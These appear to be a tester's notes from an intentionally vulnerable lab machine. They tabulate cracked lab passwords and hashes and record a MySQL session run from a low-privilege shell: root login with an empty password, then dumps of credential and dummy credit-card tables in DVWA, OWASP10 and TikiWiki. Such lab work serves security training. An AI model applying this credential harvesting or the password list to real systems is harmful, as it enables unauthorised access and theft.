
dvwa, users:

| user    | MD5 Hash                           | Password   |
| ------- | ---------------------------------- | ---------- |
| admin   | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| gordonb | `e99a18c428cb38d5f260853678922e03` | `abc123`   |
| 1337    | `8d3533d75ae2c3966d7e0d4fcc69216b` | `letmein`  |
| pablo   | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein`  |
| smithy  | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |

owasp 10, accounts:

| cid | username | password     | mysignature                 | is_admin |
| --- | -------- | ------------ | --------------------------- | -------- |
| 1   | admin    | adminpass    | Monkey!                     | TRUE     |
| 2   | adrian   | somepassword | Zombie Films Rock!          | TRUE     |
| 3   | john     | monkey       | I like the smell of confunk | FALSE    |
| 4   | jeremy   | password     | d1373 1337 speak            | FALSE    |
| 5   | bryce    | password     | I Love SANS                 | FALSE    |
| 6   | samurai  | samurai      | Carving Fools               | FALSE    |
| 7   | jim      | password     | Jim Rome is Burning         | FALSE    |
| 8   | bobby    | password     | Hank is my dad              | FALSE    |
| 9   | simba    | password     | I am a cat                  | FALSE    |
| 10  | dreveil  | password     | Preparation H               | FALSE    |
| 11  | scotty   | password     | Scotty Do                   | FALSE    |
| 12  | cal      | password     | Go Wildcats                 | FALSE    |
| 13  | john     | password     | Do the Duggie!              | FALSE    |
| 14  | kevin    | 42           | Doug Adams rocks            | FALSE    |
| 15  | dave     | set          | Bet on S.E.T. FTW           | FALSE    |
| 16  | ed       | pentest      | Commandline KungFu anyone?  | FALSE    |

tikiwiki, users_users

| user  | MD5 Hash                           | Password     |
| ----- | ---------------------------------- | ------------ |
| admin | `f6fdffe48c908deb0f4c3bd36c032e72` | `adminadmin` |

all passwords:

password
abc123
letmein
adminpass
somepassword
monkey
samurai
42
set
pentest
admin
adminadmin


```sh
daemon@lame:/tmp$ mysql -u root -p ""
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 15
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| dvwa               | 
| metasploit         | 
| mysql              | 
| owasp10            | 
| tikiwiki           | 
| tikiwiki195        | 
+--------------------+
7 rows in set (0.00 sec)

mysql> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
    -> ;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              | 
| db                        | 
| func                      | 
| help_category             | 
| help_keyword              | 
| help_relation             | 
| help_topic                | 
| host                      | 
| proc                      | 
| procs_priv                | 
| tables_priv               | 
| time_zone                 | 
| time_zone_leap_second     | 
| time_zone_name            | 
| time_zone_transition      | 
| time_zone_transition_type | 
| user                      | 
+---------------------------+
17 rows in set (0.00 sec)

mysql> select * from user
    -> ;
+------+------------------+----------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+
| Host | User             | Password | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections |
+------+------------------+----------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+
|      | debian-sys-maint |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | N                | N              | N                   | N                  | N                |          |            |             |              |             0 |           0 |               0 |                    0 | 
| %    | root             |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                |          | Y          |             |              |             0 |           0 |               0 |                    0 | 
| %    | guest            |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                |          | Y          |             |              |             0 |           0 |               0 |                    0 | 
+------+------------------+----------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+
3 rows in set (0.00 sec)

mysql> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| dvwa               | 
| metasploit         | 
| mysql              | 
| owasp10            | 
| tikiwiki           | 
| tikiwiki195        | 
+--------------------+
7 rows in set (0.00 sec)

mysql> use metasploit;
Database changed
mysql> show tables;
Empty set (0.00 sec)

mysql> use dvwa;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      | 
| users          | 
+----------------+
2 rows in set (0.00 sec)

mysql> select * from users;
+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
| user_id | first_name | last_name | user    | password                         | avatar                                                |
+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 
|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | 
|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 
|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 
|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 
+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
5 rows in set (0.01 sec)

mysql> Aborted
daemon@lame:/tmp$ select * from guestbook;
bash: syntax error near unexpected token `from'
daemon@lame:/tmp$ mysql -u root -p ""
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 16
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases
    -> ;  
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| dvwa               | 
| metasploit         | 
| mysql              | 
| owasp10            | 
| tikiwiki           | 
| tikiwiki195        | 
+--------------------+
7 rows in set (0.00 sec)

mysql> use dvwa
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> ;
ERROR: 
No query specified

mysql> show tables
    -> ;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      | 
| users          | 
+----------------+
2 rows in set (0.00 sec)

mysql> select * from guestbook;
+------------+-------------------------+------+
| comment_id | comment                 | name |
+------------+-------------------------+------+
|          1 | This is a test comment. | test | 
+------------+-------------------------+------+
1 row in set (0.00 sec)

mysql> use owasp10;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
    -> ;
+-------------------+
| Tables_in_owasp10 |
+-------------------+
| accounts          | 
| blogs_table       | 
| captured_data     | 
| credit_cards      | 
| hitlog            | 
| pen_test_tools    | 
+-------------------+
6 rows in set (0.00 sec)

mysql> select * from accounts;
+-----+----------+--------------+-----------------------------+----------+
| cid | username | password     | mysignature                 | is_admin |
+-----+----------+--------------+-----------------------------+----------+
|   1 | admin    | adminpass    | Monkey!                     | TRUE     | 
|   2 | adrian   | somepassword | Zombie Films Rock!          | TRUE     | 
|   3 | john     | monkey       | I like the smell of confunk | FALSE    | 
|   4 | jeremy   | password     | d1373 1337 speak            | FALSE    | 
|   5 | bryce    | password     | I Love SANS                 | FALSE    | 
|   6 | samurai  | samurai      | Carving Fools               | FALSE    | 
|   7 | jim      | password     | Jim Rome is Burning         | FALSE    | 
|   8 | bobby    | password     | Hank is my dad              | FALSE    | 
|   9 | simba    | password     | I am a cat                  | FALSE    | 
|  10 | dreveil  | password     | Preparation H               | FALSE    | 
|  11 | scotty   | password     | Scotty Do                   | FALSE    | 
|  12 | cal      | password     | Go Wildcats                 | FALSE    | 
|  13 | john     | password     | Do the Duggie!              | FALSE    | 
|  14 | kevin    | 42           | Doug Adams rocks            | FALSE    | 
|  15 | dave     | set          | Bet on S.E.T. FTW           | FALSE    | 
|  16 | ed       | pentest      | Commandline KungFu anyone?  | FALSE    | 
+-----+----------+--------------+-----------------------------+----------+
16 rows in set (0.01 sec)

mysql> select * from captured_data;
Empty set (0.00 sec)

mysql> select * from blogs_table;  
+-----+--------------+----------------------------------------------------------------------------------------------+---------------------+
| cid | blogger_name | comment                                                                                      | date                |
+-----+--------------+----------------------------------------------------------------------------------------------+---------------------+
|   1 | adrian       | Well, I've been working on this for a bit. Welcome to my crappy blog software. :)            | 2009-03-01 22:26:12 | 
|   2 | adrian       | Looks like I got a lot more work to do. Fun, Fun, Fun!!!                                     | 2009-03-01 22:26:54 | 
|   3 | anonymous    | An anonymous blog? Huh?                                                                      | 2009-03-01 22:27:11 | 
|   4 | ed           | I love me some Netcat!!!                                                                     | 2009-03-01 22:27:48 | 
|   5 | john         | Listen to Pauldotcom!                                                                        | 2009-03-01 22:29:04 | 
|   6 | jeremy       | Why give users the ability to get to the unfiltered Internet? It's just asking for trouble.  | 2009-03-01 22:29:49 | 
|   7 | john         | Chocolate is GOOD!!!                                                                         | 2009-03-01 22:30:06 | 
|   8 | admin        | Fear me, for I am ROOT!                                                                      | 2009-03-01 22:31:13 | 
|   9 | dave         | Social Engineering is woot-tastic                                                            | 2009-03-01 22:31:13 | 
|  10 | kevin        | Read more Douglas Adams                                                                      | 2009-03-01 22:31:13 | 
|  11 | kevin        | You should take SANS SEC542                                                                  | 2009-03-01 22:31:13 | 
|  12 | asprox       | Fear me, for I am asprox!                                                                    | 2009-03-01 22:31:13 | 
+-----+--------------+----------------------------------------------------------------------------------------------+---------------------+
12 rows in set (0.00 sec)

mysql> select * from credit_cards;
+------+------------------+------+------------+
| ccid | ccnumber         | ccv  | expiration |
+------+------------------+------+------------+
|    1 | 4444111122223333 | 745  | 2012-03-01 | 
|    2 | 7746536337776330 | 722  | 2015-04-01 | 
|    3 | 8242325748474749 | 461  | 2016-03-01 | 
|    4 | 7725653200487633 | 230  | 2017-06-01 | 
|    5 | 1234567812345678 | 627  | 2018-11-01 | 
+------+------------------+------+------------+
5 rows in set (0.00 sec)

mysql> select * from hitlog;
Empty set (0.00 sec)

mysql> select * from pen_test_tools;
+---------+------------------------------+----------------+----------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| tool_id | tool_name                    | phase_to_use   | tool_type                  | comment                                                                                                                                                                                                                                                                                                                                                                        |
+---------+------------------------------+----------------+----------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|       1 | WebSecurify                  | Discovery      | Scanner                    | Can capture screenshots automatically                                                                                                                                                                                                                                                                                                                                          | 
|       2 | Grendel-Scan                 | Discovery      | Scanner                    | Has interactive-mode. Lots plug-ins. Includes Nikto. May not spider JS menus well.                                                                                                                                                                                                                                                                                             | 
|       3 | Skipfish                     | Discovery      | Scanner                    | Agressive. Fast. Uses wordlists to brute force directories.                                                                                                                                                                                                                                                                                                                    | 
|       4 | w3af                         | Discovery      | Scanner                    | GUI simple to use. Can call sqlmap. Allows scan packages to be saved in profiles. Provides evasion, discovery, brute force, vulneraility assessment (audit), exploitation, pattern matching (grep).                                                                                                                                                                            | 
|       5 | Burp-Suite                   | Discovery      | Scanner                    | GUI simple to use. Provides highly configurable manual scan assistence with productivity enhancements.                                                                                                                                                                                                                                                                         | 
|       6 | Netsparker Community Edition | Discovery      | Scanner                    | Excellent spider abilities and reporting. GUI driven. Runs on Windows. Good at SQLi and XSS detection. From Mavituna Security. Professional version available for purchase.                                                                                                                                                                                                    | 
|       7 | NeXpose                      | Discovery      | Scanner                    | GUI driven. Runs on Windows. From Rapid7. Professional version available for purchase. Updates automatically. Requires large amounts of memory.                                                                                                                                                                                                                                | 
|       8 | Hailstorm                    | Discovery      | Scanner                    | From Cenzic. Professional version requires dedicated staff, multiple dediciated servers, professional pen-tester to analyze results, and very large license fee. Extensive scanning ability. Very large vulnerability database. Highly configurable. Excellent reporting. Can scan entire networks of web applications. Extremely expensive. Requires large amounts of memory. | 
|       9 | Tamper Data                  | Discovery      | Interception Proxy         | Firefox add-on. Easy to use. Tampers with POST parameters and HTTP Headers. Does not tamper with URL query parameters. Requires manual browsing.                                                                                                                                                                                                                               | 
|      10 | DirBuster                    | Discovery      | Fuzzer                     | OWASP tool. Fuzzes directory names to brute force directories.                                                                                                                                                                                                                                                                                                                 | 
|      11 | SQL Inject Me                | Discovery      | Fuzzer                     | Firefox add-on. Attempts common strings which elicit XSS responses. Not compatible with Firefox 8.0.                                                                                                                                                                                                                                                                           | 
|      12 | XSS Me                       | Discovery      | Fuzzer                     | Firefox add-on. Attempts common strings which elicit responses from databases when SQL injection is present. Not compatible with Firefox 8.0.                                                                                                                                                                                                                                  | 
|      13 | GreaseMonkey                 | Discovery      | Browser Manipulation Tool  | Firefox add-on. Allows the user to inject JavaScripts and change page.                                                                                                                                                                                                                                                                                                         | 
|      14 | NSLookup                     | Reconnaissance | DNS Server Query Tool      | DNS query tool can query DNS name or reverse lookup on IP. Set debug for better output. Premiere tool on Windows but Linux perfers Dig. DNS traffic generally over UDP 53 unless response long then over TCP 53. Online version combined with anonymous proxy or TOR network may be prefered for stealth.                                                                      | 
|      15 | Whois                        | Reconnaissance | Domain name lookup service | Whois is available in Linux naitvely and Windows as a Sysinternals download plus online. Whois can lookup the registrar of a domain and the IP block associated. An online version is http://network-tools.com/                                                                                                                                                                | 
|      16 | Dig                          | Reconnaissance | DNS Server Query Tool      | The Domain Information Groper is prefered on Linux over NSLookup and provides more information natively. NSLookup must be in debug mode to give similar output. DIG can perform zone transfers if the DNS server allows transfers.                                                                                                                                             | 
|      17 | Fierce Domain Scanner        | Reconnaissance | DNS Server Query Tool      | Powerful DNS scan tool. FDS is a Perl program which scans and reverse scans a domain plus scans IPs within the same block to look for neighoring machines. Available in the Samurai and Backtrack distributions plus http://ha.ckers.org/fierce/                                                                                                                               | 
|      18 | host                         | Reconnaissance | DNS Server Query Tool      | A simple DNS lookup tool included with BIND. The tool is a friendly and capible command line tool with excellent documentation. Does not posess the automation of FDS.                                                                                                                                                                                                         | 
|      19 | zaproxy                      | Reconnaissance | Interception Proxy         | OWASP Zed Attack Proxy. An interception proxy that can also passively or actively scan applications as well as perform brute-forcing. Similar to Burp-Suite without the disadvantage of requiring a costly license.                                                                                                                                                            | 
|      20 | Google intitle               | Discovery      | Search Engine              | intitle and site directives allow directory discovery. GHDB available to provide hints. See Hackers for Charity site.                                                                                                                                                                                                                                                          | 
+---------+------------------------------+----------------+----------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
20 rows in set (0.00 sec)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| dvwa               | 
| metasploit         | 
| mysql              | 
| owasp10            | 
| tikiwiki           | 
| tikiwiki195        | 
+--------------------+
7 rows in set (0.00 sec)

mysql> use tikiwiki;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------------------+
| Tables_in_tikiwiki                 |
+------------------------------------+
| galaxia_activities                 | 
| galaxia_activity_roles             | 
| galaxia_instance_activities        | 
| galaxia_instance_comments          | 
| galaxia_instances                  | 
| galaxia_processes                  | 
| galaxia_roles                      | 
| galaxia_transitions                | 
| galaxia_user_roles                 | 
| galaxia_workitems                  | 
| messu_archive                      | 
| messu_messages                     | 
| messu_sent                         | 
| sessions                           | 
| tiki_actionlog                     | 
| tiki_article_types                 | 
| tiki_articles                      | 
| tiki_banners                       | 
| tiki_banning                       | 
| tiki_banning_sections              | 
| tiki_blog_activity                 | 
| tiki_blog_posts                    | 
| tiki_blog_posts_images             | 
| tiki_blogs                         | 
| tiki_calendar_categories           | 
| tiki_calendar_items                | 
| tiki_calendar_locations            | 
| tiki_calendar_roles                | 
| tiki_calendars                     | 
| tiki_categories                    | 
| tiki_categorized_objects           | 
| tiki_category_objects              | 
| tiki_category_sites                | 
| tiki_chart_items                   | 
| tiki_charts                        | 
| tiki_charts_rankings               | 
| tiki_charts_votes                  | 
| tiki_chat_channels                 | 
| tiki_chat_messages                 | 
| tiki_chat_users                    | 
| tiki_comments                      | 
| tiki_content                       | 
| tiki_content_templates             | 
| tiki_content_templates_sections    | 
| tiki_cookies                       | 
| tiki_copyrights                    | 
| tiki_directory_categories          | 
| tiki_directory_search              | 
| tiki_directory_sites               | 
| tiki_download                      | 
| tiki_drawings                      | 
| tiki_dsn                           | 
| tiki_dynamic_variables             | 
| tiki_eph                           | 
| tiki_extwiki                       | 
| tiki_faq_questions                 | 
| tiki_faqs                          | 
| tiki_featured_links                | 
| tiki_file_galleries                | 
| tiki_file_handlers                 | 
| tiki_files                         | 
| tiki_forum_attachments             | 
| tiki_forum_reads                   | 
| tiki_forums                        | 
| tiki_forums_queue                  | 
| tiki_forums_reported               | 
| tiki_friends                       | 
| tiki_friendship_requests           | 
| tiki_galleries                     | 
| tiki_galleries_scales              | 
| tiki_games                         | 
| tiki_group_inclusion               | 
| tiki_history                       | 
| tiki_hotwords                      | 
| tiki_html_pages                    | 
| tiki_html_pages_dynamic_zones      | 
| tiki_images                        | 
| tiki_images_data                   | 
| tiki_integrator_reps               | 
| tiki_integrator_rules              | 
| tiki_language                      | 
| tiki_languages                     | 
| tiki_link_cache                    | 
| tiki_links                         | 
| tiki_live_support_events           | 
| tiki_live_support_message_comments | 
| tiki_live_support_messages         | 
| tiki_live_support_modules          | 
| tiki_live_support_operators        | 
| tiki_live_support_requests         | 
| tiki_logs                          | 
| tiki_mail_events                   | 
| tiki_mailin_accounts               | 
| tiki_menu_languages                | 
| tiki_menu_options                  | 
| tiki_menus                         | 
| tiki_minical_events                | 
| tiki_minical_topics                | 
| tiki_modules                       | 
| tiki_newsletter_groups             | 
| tiki_newsletter_subscriptions      | 
| tiki_newsletters                   | 
| tiki_newsreader_marks              | 
| tiki_newsreader_servers            | 
| tiki_object_ratings                | 
| tiki_page_footnotes                | 
| tiki_pages                         | 
| tiki_pageviews                     | 
| tiki_poll_objects                  | 
| tiki_poll_options                  | 
| tiki_polls                         | 
| tiki_preferences                   | 
| tiki_private_messages              | 
| tiki_programmed_content            | 
| tiki_quicktags                     | 
| tiki_quiz_question_options         | 
| tiki_quiz_questions                | 
| tiki_quiz_results                  | 
| tiki_quiz_stats                    | 
| tiki_quiz_stats_sum                | 
| tiki_quizzes                       | 
| tiki_received_articles             | 
| tiki_received_pages                | 
| tiki_referer_stats                 | 
| tiki_related_categories            | 
| tiki_rss_feeds                     | 
| tiki_rss_modules                   | 
| tiki_score                         | 
| tiki_search_stats                  | 
| tiki_searchindex                   | 
| tiki_searchsyllable                | 
| tiki_searchwords                   | 
| tiki_secdb                         | 
| tiki_semaphores                    | 
| tiki_sent_newsletters              | 
| tiki_sessions                      | 
| tiki_sheet_layout                  | 
| tiki_sheet_values                  | 
| tiki_sheets                        | 
| tiki_shoutbox                      | 
| tiki_shoutbox_words                | 
| tiki_stats                         | 
| tiki_structure_versions            | 
| tiki_structures                    | 
| tiki_submissions                   | 
| tiki_suggested_faq_questions       | 
| tiki_survey_question_options       | 
| tiki_survey_questions              | 
| tiki_surveys                       | 
| tiki_tags                          | 
| tiki_theme_control_categs          | 
| tiki_theme_control_objects         | 
| tiki_theme_control_sections        | 
| tiki_topics                        | 
| tiki_tracker_fields                | 
| tiki_tracker_item_attachments      | 
| tiki_tracker_item_comments         | 
| tiki_tracker_item_fields           | 
| tiki_tracker_items                 | 
| tiki_tracker_options               | 
| tiki_trackers                      | 
| tiki_translated_objects            | 
| tiki_untranslated                  | 
| tiki_user_answers                  | 
| tiki_user_answers_uploads          | 
| tiki_user_assigned_modules         | 
| tiki_user_bookmarks_folders        | 
| tiki_user_bookmarks_urls           | 
| tiki_user_mail_accounts            | 
| tiki_user_menus                    | 
| tiki_user_modules                  | 
| tiki_user_notes                    | 
| tiki_user_postings                 | 
| tiki_user_preferences              | 
| tiki_user_quizzes                  | 
| tiki_user_taken_quizzes            | 
| tiki_user_tasks                    | 
| tiki_user_tasks_history            | 
| tiki_user_votings                  | 
| tiki_user_watches                  | 
| tiki_userfiles                     | 
| tiki_userpoints                    | 
| tiki_users                         | 
| tiki_users_score                   | 
| tiki_webmail_contacts              | 
| tiki_webmail_messages              | 
| tiki_wiki_attachments              | 
| tiki_zones                         | 
| users_grouppermissions             | 
| users_groups                       | 
| users_objectpermissions            | 
| users_permissions                  | 
| users_usergroups                   | 
| users_users                        | 
+------------------------------------+
194 rows in set (0.00 sec)

mysql> select * from users_users;
+--------+-------+-------+----------+----------+---------------+-----------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+-------+
| userId | email | login | password | provpass | default_group | lastLogin | currentLogin | registrationDate | challenge | pass_due | hash                             | created | avatarName | avatarSize | avatarFileType | avatarData | avatarLibName | avatarType | score | valid |
+--------+-------+-------+----------+----------+---------------+-----------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+-------+
|      1 |       | admin | admin    | NULL     | NULL          |      NULL |         NULL |             NULL | NULL      |     NULL | f6fdffe48c908deb0f4c3bd36c032e72 |    NULL | NULL       |       NULL | NULL           | NULL       | NULL          | NULL       |     0 | NULL  | 
+--------+-------+-------+----------+----------+---------------+-----------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+-------+
1 row in set (0.00 sec)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| dvwa               | 
| metasploit         | 
| mysql              | 
| owasp10            | 
| tikiwiki           | 
| tikiwiki195        | 
+--------------------+
7 rows in set (0.00 sec)

mysql> use tikitwiki195
ERROR 1049 (42000): Unknown database 'tikitwiki195'
mysql> use tikiwiki195;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------------------+
| Tables_in_tikiwiki195              |
+------------------------------------+
| galaxia_activities                 | 
| galaxia_activity_roles             | 
| galaxia_instance_activities        | 
| galaxia_instance_comments          | 
| galaxia_instances                  | 
| galaxia_processes                  | 
| galaxia_roles                      | 
| galaxia_transitions                | 
| galaxia_user_roles                 | 
| galaxia_workitems                  | 
| messu_archive                      | 
| messu_messages                     | 
| messu_sent                         | 
| sessions                           | 
| tiki_actionlog                     | 
| tiki_article_types                 | 
| tiki_articles                      | 
| tiki_banners                       | 
| tiki_banning                       | 
| tiki_banning_sections              | 
| tiki_blog_activity                 | 
| tiki_blog_posts                    | 
| tiki_blog_posts_images             | 
| tiki_blogs                         | 
| tiki_calendar_categories           | 
| tiki_calendar_items                | 
| tiki_calendar_locations            | 
| tiki_calendar_roles                | 
| tiki_calendars                     | 
| tiki_categories                    | 
| tiki_categorized_objects           | 
| tiki_category_objects              | 
| tiki_category_sites                | 
| tiki_chart_items                   | 
| tiki_charts                        | 
| tiki_charts_rankings               | 
| tiki_charts_votes                  | 
| tiki_chat_channels                 | 
| tiki_chat_messages                 | 
| tiki_chat_users                    | 
| tiki_comments                      | 
| tiki_content                       | 
| tiki_content_templates             | 
| tiki_content_templates_sections    | 
| tiki_cookies                       | 
| tiki_copyrights                    | 
| tiki_directory_categories          | 
| tiki_directory_search              | 
| tiki_directory_sites               | 
| tiki_download                      | 
| tiki_drawings                      | 
| tiki_dsn                           | 
| tiki_dynamic_variables             | 
| tiki_eph                           | 
| tiki_extwiki                       | 
| tiki_faq_questions                 | 
| tiki_faqs                          | 
| tiki_featured_links                | 
| tiki_file_galleries                | 
| tiki_file_handlers                 | 
| tiki_files                         | 
| tiki_forum_attachments             | 
| tiki_forum_reads                   | 
| tiki_forums                        | 
| tiki_forums_queue                  | 
| tiki_forums_reported               | 
| tiki_friends                       | 
| tiki_friendship_requests           | 
| tiki_galleries                     | 
| tiki_galleries_scales              | 
| tiki_games                         | 
| tiki_group_inclusion               | 
| tiki_history                       | 
| tiki_hotwords                      | 
| tiki_html_pages                    | 
| tiki_html_pages_dynamic_zones      | 
| tiki_images                        | 
| tiki_images_data                   | 
| tiki_integrator_reps               | 
| tiki_integrator_rules              | 
| tiki_language                      | 
| tiki_languages                     | 
| tiki_link_cache                    | 
| tiki_links                         | 
| tiki_live_support_events           | 
| tiki_live_support_message_comments | 
| tiki_live_support_messages         | 
| tiki_live_support_modules          | 
| tiki_live_support_operators        | 
| tiki_live_support_requests         | 
| tiki_logs                          | 
| tiki_mail_events                   | 
| tiki_mailin_accounts               | 
| tiki_menu_languages                | 
| tiki_menu_options                  | 
| tiki_menus                         | 
| tiki_minical_events                | 
| tiki_minical_topics                | 
| tiki_modules                       | 
| tiki_newsletter_groups             | 
| tiki_newsletter_subscriptions      | 
| tiki_newsletters                   | 
| tiki_newsreader_marks              | 
| tiki_newsreader_servers            | 
| tiki_object_ratings                | 
| tiki_page_footnotes                | 
| tiki_pages                         | 
| tiki_pageviews                     | 
| tiki_poll_objects                  | 
| tiki_poll_options                  | 
| tiki_polls                         | 
| tiki_preferences                   | 
| tiki_private_messages              | 
| tiki_programmed_content            | 
| tiki_quicktags                     | 
| tiki_quiz_question_options         | 
| tiki_quiz_questions                | 
| tiki_quiz_results                  | 
| tiki_quiz_stats                    | 
| tiki_quiz_stats_sum                | 
| tiki_quizzes                       | 
| tiki_received_articles             | 
| tiki_received_pages                | 
| tiki_referer_stats                 | 
| tiki_related_categories            | 
| tiki_rss_feeds                     | 
| tiki_rss_modules                   | 
| tiki_score                         | 
| tiki_search_stats                  | 
| tiki_searchindex                   | 
| tiki_searchsyllable                | 
| tiki_searchwords                   | 
| tiki_secdb                         | 
| tiki_semaphores                    | 
| tiki_sent_newsletters              | 
| tiki_sessions                      | 
| tiki_sheet_layout                  | 
| tiki_sheet_values                  | 
| tiki_sheets                        | 
| tiki_shoutbox                      | 
| tiki_shoutbox_words                | 
| tiki_stats                         | 
| tiki_structure_versions            | 
| tiki_structures                    | 
| tiki_submissions                   | 
| tiki_suggested_faq_questions       | 
| tiki_survey_question_options       | 
| tiki_survey_questions              | 
| tiki_surveys                       | 
| tiki_tags                          | 
| tiki_theme_control_categs          | 
| tiki_theme_control_objects         | 
| tiki_theme_control_sections        | 
| tiki_topics                        | 
| tiki_tracker_fields                | 
| tiki_tracker_item_attachments      | 
| tiki_tracker_item_comments         | 
| tiki_tracker_item_fields           | 
| tiki_tracker_items                 | 
| tiki_tracker_options               | 
| tiki_trackers                      | 
| tiki_translated_objects            | 
| tiki_untranslated                  | 
| tiki_user_answers                  | 
| tiki_user_answers_uploads          | 
| tiki_user_assigned_modules         | 
| tiki_user_bookmarks_folders        | 
| tiki_user_bookmarks_urls           | 
| tiki_user_mail_accounts            | 
| tiki_user_menus                    | 
| tiki_user_modules                  | 
| tiki_user_notes                    | 
| tiki_user_postings                 | 
| tiki_user_preferences              | 
| tiki_user_quizzes                  | 
| tiki_user_taken_quizzes            | 
| tiki_user_tasks                    | 
| tiki_user_tasks_history            | 
| tiki_user_votings                  | 
| tiki_user_watches                  | 
| tiki_userfiles                     | 
| tiki_userpoints                    | 
| tiki_users                         | 
| tiki_users_score                   | 
| tiki_webmail_contacts              | 
| tiki_webmail_messages              | 
| tiki_wiki_attachments              | 
| tiki_zones                         | 
| users_grouppermissions             | 
| users_groups                       | 
| users_objectpermissions            | 
| users_permissions                  | 
| users_usergroups                   | 
| users_users                        | 
+------------------------------------+
194 rows in set (0.01 sec)

mysql> select * from users_users;
+--------+-------+-------+----------+----------+---------------+------------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+
| userId | email | login | password | provpass | default_group | lastLogin  | currentLogin | registrationDate | challenge | pass_due | hash                             | created | avatarName | avatarSize | avatarFileType | avatarData | avatarLibName | avatarType | score |
+--------+-------+-------+----------+----------+---------------+------------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+
|      1 |       | admin | admin    | NULL     | NULL          | 1271712540 |   1271712540 |             NULL | NULL      |     NULL | f6fdffe48c908deb0f4c3bd36c032e72 |    NULL | NULL       |       NULL | NULL           | NULL       | NULL          | NULL       |     0 | 
+--------+-------+-------+----------+----------+---------------+------------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+
1 row in set (0.00 sec)

mysql> exit
Bye
```
